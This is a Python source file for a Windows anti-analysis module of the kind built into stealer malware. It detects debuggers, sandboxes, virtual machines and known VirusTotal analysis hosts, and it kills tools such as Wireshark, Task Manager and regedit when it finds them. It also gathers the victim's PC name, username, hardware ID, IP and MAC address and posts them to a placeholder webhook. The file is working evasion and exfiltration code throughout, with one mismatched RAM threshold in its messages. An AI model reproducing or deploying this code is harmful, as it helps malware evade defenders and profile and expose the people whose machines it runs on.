import sys, os, re, ctypes, subprocess, requests, uuid, wmi, psutil, time, httpx, platform, win32api, win32process
from datetime import datetime
from aes256 import encstr
from threading import Thread
from ctypes import *


#region Config
api = "URL_HERE"
sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
program_blacklist = [
    "httpdebuggerui.exe", 
    "wireshark.exe", 
    "HTTPDebuggerSvc.exe", 
    "fiddler.exe", 
    "regedit.exe", 
    "taskmgr.exe", 
    "vboxservice.exe", 
    "df5serv.exe", 
    "processhacker.exe", 
    "vboxtray.exe", 
    "vmtoolsd.exe", 
    "vmwaretray.exe", 
    "ida64.exe", 
    "ollydbg.exe",
    "pestudio.exe", 
    "vmwareuser", 
    "vgauthservice.exe", 
    "vmacthlp.exe", 
    "x96dbg.exe", 
    "vmsrvc.exe", 
    "x32dbg.exe", 
    "vmusrvc.exe", 
    "prl_cc.exe", 
    "prl_tools.exe", 
    "xenservice.exe", 
    "qemu-ga.exe", 
    "joeboxcontrol.exe", 
    "ksdumperclient.exe", 
    "ksdumper.exe",
    "joeboxserver.exe"
]

vmcheck_switch = True
vtdetect_switch = True
listcheck_switch = True
anti_debug_switch = True
#endregion


def post_message(msg):
    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})

def anti_debug():
    '''
    Will attempt to close any running debuggers then exit the program.

    comment out 'os._exit(1)' on line 67 to make the program not exit on debugger detection.
    '''
    while True:
        time.sleep(0.7)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in program_blacklist):
                try:
                    post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...") ; proc.kill()
                    os._exit(1)
                except(psutil.NoSuchProcess, psutil.AccessDenied): pass

def block_dlls():
    while True:
        time.sleep(1)
        EvidenceOfSandbox = []
        allPids = win32process.EnumProcesses()
        for pid in allPids:
            try:
                hProcess = win32api.OpenProcess(0x0410, 0, pid)
                try:
                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
                    for dll in curProcessDLLs:
                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                        for sandboxDLL in sandboxDLLs:
                            if sandboxDLL in dllName:
                                if dllName not in EvidenceOfSandbox: EvidenceOfSandbox.append(dllName)
                finally:
                        win32api.CloseHandle(hProcess)
            except: pass
        if EvidenceOfSandbox:
            requests.post(f'{api}',json={'content': f"""```yaml
The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
Dlls: {EvidenceOfSandbox}
```"""})
            os._exit(1)

def ram_check():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]

    memoryStatus = MEMORYSTATUSEX()
    memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))

    if memoryStatus.ullTotalPhys/1073741824 < 1:
        requests.post(f'{api}',json={'content': f"""```yaml
Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
```"""}) ; os._exit(1)

def is_debugger():
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()

    if (isDebuggerPresent):
        requests.post(f'{api}',json={'content': f"""```yaml
IsDebuggerPresent: A debugger is present, exiting program...
```"""}) ; os._exit(1)

    if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
        requests.post(f'{api}',json={'content': f"""```yaml
CheckRemoteDebuggerPresent: A debugger is present, exiting program...
```"""}) ; os._exit(1)

def disk_check():
    minDiskSizeGB = 50
    if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
    _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
    diskSizeGB = diskSizeBytes/1073741824

    if diskSizeGB < minDiskSizeGB:
        requests.post(f'{api}',json={'content': f"""```yaml
Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
```"""}) ; os._exit(1)

def getip():
    ip = "None"
    try: ip = requests.get("https://api.ipify.org").text
    except: pass
    return ip


ip = getip()
serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
gpu = computer.Win32_VideoController()[0].Name
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')


def vtdetect():
    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {gpu}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})


def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv(): # If vm is detected
        post_message("**VM DETECTED, EXITING PROGRAM...**") ; os._exit(1)
    
    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:
            post_message("VMware Registry Detected") ; os._exit(1)

    def processes_and_files_check():
        vmware_dll      = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll  = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")   

        process         = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList     = []

        for processNames in process.split(" "):
            if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: 
            post_message("VMwareService.exe & VMwareTray.exe process are running") ; os._exit(1)
                        
        if os.path.exists(vmware_dll): 
            post_message("**Vmware DLL Detected**") ; os._exit(1)
            
        if os.path.exists(virtualbox_dll): 
            post_message("**VirtualBox DLL Detected**") ; os._exit(1)   

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list: post_message("**VMware MAC Address Detected**") ; os._exit(1)


    registry_check(), processes_and_files_check(), mac_check()
    post_message("[+] VM Not Detected") 


def listcheck():
    try:
        if hwid in hwidlist.text:
            post_message(f"**Blacklisted HWID Detected. HWID:** `{hwid}`")
            time.sleep(2) ; os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2) ; os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            post_message(f"**Blacklisted PC User:** `{serveruser}`")
            time.sleep(2) ; os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2) ; os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            post_message(f"**Blacklisted PC Name:** `{pc_name}`")
            time.sleep(2) ; os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2) ; os._exit(1)

    try:
        if ip in iplist.text:
            post_message(f"**Blacklisted IP:** `{ip}`")
            time.sleep(2) ; os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2) ; os._exit(1)

    try:
        if mac in maclist.text:
            post_message(f"**Blacklisted MAC:** `{mac}`")
            time.sleep(2) ; os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2) ; os._exit(1)

    try:
        if gpu in gpulist.text:        
            post_message(f"**Blacklisted GPU:** `{gpu}`")
            time.sleep(2) ; os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2) ; os._exit(1)


def main():
    is_debugger(), disk_check(), ram_check() # Run all checks
    if anti_debug_switch:
        try: Thread(name='Anti-Debug', target=anti_debug).start() ; Thread(name='Anti-DLL', target=block_dlls).start()
        except: pass
    
    if vtdetect_switch:     vtdetect()      # VTDETECT
    if vmcheck_switch:      vmcheck()       # VMCHECK
    if listcheck_switch:    listcheck()     # LISTCHECK



'''
Check if the script is available to connect to the internet.
'''
if __name__ == '__main__': 
    if platform.system() == 'Windows':
        try: httpx.get('https://google.com')
        except (httpx.NetworkError, httpx.TimeoutException): os._exit(1)
        main()
    else: os._exit(1)
